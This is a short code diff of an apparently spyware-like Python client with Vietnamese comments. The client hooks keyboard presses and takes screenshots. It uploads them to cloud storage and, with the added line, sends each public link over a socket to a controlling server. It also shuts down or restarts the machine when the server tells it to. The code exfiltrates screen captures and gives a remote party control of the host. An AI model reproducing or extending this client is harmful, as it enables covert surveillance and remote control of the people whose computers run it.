@@ -49,6 +49,8 @@ def takeScreenshot():
         # Gửi link ảnh đến server
         link = blob.public_url
         print("Link: ",  link)
+        clientSocket.send(link.encode('utf-8'))
+
     except Exception as e:
         print("Error: " + str(e))
 
@@ -58,11 +60,8 @@ with Listener(on_press=on_press) as parent:
         while True:
             message = clientSocket.recv(1024).decode('utf-8')
             print("Message:" + message)
-            if message == 'takeScreenshots':
+            if message == 'takeScreenshot':
                 takeScreenshot()
-                # print("Link:" + link)
-                # clientSocket.send(link.encode('utf-8'))
-
             elif message == 'shutdown':
                 os.system("shutdown /s /t 1")
             elif message == 'restart':
